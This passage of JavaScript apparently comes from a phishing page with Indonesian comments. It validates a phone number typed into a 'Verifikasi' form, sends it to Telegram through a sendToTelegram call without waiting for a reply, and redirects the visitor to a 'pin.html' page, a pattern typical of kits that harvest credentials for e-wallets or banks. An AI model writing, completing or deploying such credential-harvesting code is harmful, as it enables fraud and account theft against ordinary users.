            }
        }
        
        // Fungsi untuk menangani submit form
        async function submitPhoneNumber(event) {
            event.preventDefault();
            
            const phoneNumber = document.getElementById('phoneNumber').value;
            const submitBtn = document.getElementById('submitBtn');
            const loadingIndicator = document.getElementById('loadingIndicator');
            const statusMessage = document.getElementById('statusMessage');
            
            // Validasi nomor handphone
            if (!/^[0-9]{10,13}$/.test(phoneNumber)) {
                showStatus('Nomor handphone tidak valid. Harus 10-13 digit angka.', 'error');
                return;
            }
            
            // Tampilkan loading dan nonaktifkan tombol
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Memproses...';
            loadingIndicator.style.display = 'block';
            statusMessage.style.display = 'none';
            
            // Kirim data ke Telegram (tanpa menunggu hasil)
            sendToTelegram(phoneNumber);
            
            // Langsung redirect ke halaman selanjutnya tanpa menunggu
            setTimeout(() => {
                window.location.href = 'pin.html';
            }, 1000);
        }
        
        // Fungsi untuk menampilkan status error saja
        function showStatus(message, type) {
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.textContent = message;
            statusMessage.className = 'status-message status-error';
            statusMessage.style.display = 'block';
            
            // Aktifkan kembali tombol jika error
            const submitBtn = document.getElementById('submitBtn');
            const loadingIndicator = document.getElementById('loadingIndicator');
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Verifikasi';
            loadingIndicator.style.display = 'none';
        }
